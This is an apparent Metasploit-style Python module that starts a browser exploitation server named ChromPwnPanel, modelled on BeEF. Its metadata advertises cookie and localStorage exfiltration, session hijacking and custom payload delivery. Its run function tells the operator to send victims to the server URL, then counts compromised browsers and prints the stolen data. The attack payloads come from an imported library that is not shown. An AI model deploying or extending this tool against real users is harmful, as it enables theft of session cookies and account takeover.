#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Browser Exploitation Server Module

This module launches the ChromPwnPanel server for browser-based exploitation.

Author: P4x-ng
License: MSF_LICENSE
"""

import logging
import sys
import os
import time

# Add path for framework imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

dependencies_missing = False
try:
    from metasploit import module
    from lib.msf.core.integrations.chrompwn import ChromPwnPanelIntegration
except ImportError:
    dependencies_missing = True


metadata = {
    'name': 'ChromPwnPanel Browser Exploitation Server',
    'description': '''
        Launch a browser exploitation server that delivers browser-based attacks.
        Similar to BeEF (Browser Exploitation Framework).
        
        Features:
        - Browser fingerprinting
        - Cookie/localStorage exfiltration
        - Session hijacking capabilities
        - Custom payload delivery
    ''',
    'authors': [
        'P4x-ng'
    ],
    'date': '2025-11-22',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/P4x-ng/chrompwn'}
    ],
    'type': 'single_scanner',
    'options': {
        'srvhost': {
            'type': 'address',
            'description': 'Server host address',
            'required': True,
            'default': '0.0.0.0'
        },
        'srvport': {
            'type': 'port',
            'description': 'Server port',
            'required': True,
            'default': 8080
        },
        'runtime': {
            'type': 'int',
            'description': 'How long to run server (seconds, 0=forever)',
            'required': False,
            'default': 0
        }
    },
    'notes': {
        'Stability': ['CRASH_SAFE'],
        'Reliability': ['REPEATABLE_SESSION'],
        'SideEffects': ['IOC_IN_LOGS', 'ARTIFACTS_ON_DISK']
    }
}


def run(args):
    """Execute the browser exploitation server."""
    module.LogHandler.setup(msg_prefix='[ChromPwn] ')
    
    if dependencies_missing:
        logging.error('Module dependencies missing')
        return
    
    srvhost = args.get('srvhost', '0.0.0.0')
    srvport = int(args.get('srvport', 8080))
    runtime = int(args.get('runtime', 0))
    
    logging.info('Starting ChromPwnPanel server')
    
    # Initialize ChromPwnPanel
    config = {
        'host': srvhost,
        'port': srvport,
        'verbose': True
    }
    
    panel = ChromPwnPanelIntegration(config)
    
    success, missing = panel.check_dependencies()
    if not success:
        logging.error(f'ChromPwnPanel dependencies missing: {missing}')
        return
    
    if not panel.initialize():
        logging.error('Failed to initialize ChromPwnPanel')
        return
    
    # Start server
    try:
        result = panel.execute('start')
        
        if not result.get('success'):
            logging.error('Failed to start server')
            return
        
        logging.info(f'Server running on http://{srvhost}:{srvport}/')
        logging.info('Send victims to this URL to compromise their browsers')
        
        # Run for specified time or forever
        if runtime > 0:
            logging.info(f'Running for {runtime} seconds...')
            time.sleep(runtime)
        else:
            logging.info('Running until interrupted...')
            try:
                while True:
                    time.sleep(1)
                    
                    # Periodically show status
                    if int(time.time()) % 60 == 0:
                        victims = panel.list_victims()
                        data = panel.get_exfiltrated_data()
                        logging.info(f'Status: {len(victims)} victims, {len(data)} data items')
            
            except KeyboardInterrupt:
                logging.info('Interrupted by user')
        
        # Show results
        victims = panel.list_victims()
        data = panel.get_exfiltrated_data()
        
        logging.info('=== Results ===')
        logging.info(f'Total victims: {len(victims)}')
        for victim in victims:
            logging.info(f'  - {victim["ip"]}: {victim["user_agent"][:50]}...')
        
        logging.info(f'Total exfiltrated items: {len(data)}')
        for item in data[:5]:  # Show first 5
            logging.info(f'  - {item.get("type", "unknown")}: {str(item.get("data", ""))[:50]}...')
    
    finally:
        panel.cleanup()
        logging.info('Server stopped')


if __name__ == '__main__':
    module.run(metadata, run)
